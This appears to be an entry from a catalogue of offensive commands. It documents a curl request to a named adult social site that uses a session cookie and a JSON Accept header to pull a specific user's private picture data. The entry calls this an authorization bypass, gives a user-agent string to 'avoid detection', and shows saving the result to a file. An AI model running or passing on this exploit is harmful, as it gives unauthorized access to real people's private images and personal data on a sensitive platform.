---
id: 00bf5bc9-7741-409d-8f54-f49d69a6ccff
name: curl-fetlife-private-picture-json
type: command
executor: bash
data: >-
  curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie:
  _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not
  cur1"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.446Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - exploit
  - http
  - authorization-bypass
  - fetlife
verified: false
validated: true
submitted: true
---

# curl-fetlife-private-picture-json

## Command

```bash
curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

## Description

Retrieves private picture data from FetLife via JSON endpoint, exploiting auth bypass. Requires a session cookie; use for proof-of-concept on known private IDs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (https://fetlife.com/users/14104003/pictures/120041856) | Specific private picture endpoint | Yes |
| -H "Cookie: _fl_sessionid={your-session}" | Session auth cookie | Yes |
| -H "Accept: application/json" | Forces JSON for bypass | Yes |
| --user-agent "not cur1" | Avoids detection | No |

## Examples

### Basic Usage

```bash
curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie: _fl_sessionid=abc123" -H "Accept: application/json" --user-agent "not cur1"
```

### Advanced Usage

Save output to file:

```bash
curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1" -o picture.json
```

## Expected Output

JSON: {"picture":{"id":120041856,"url":"https://fetlife.com/...","caption":"Private image","visibility":"private"}}, exposing private details.

## Related

- [[commands/curl-test-fetlife-endpoint-json]]
- [[procedures/Access-Private-FetLife-Pictures-via-JSON]]
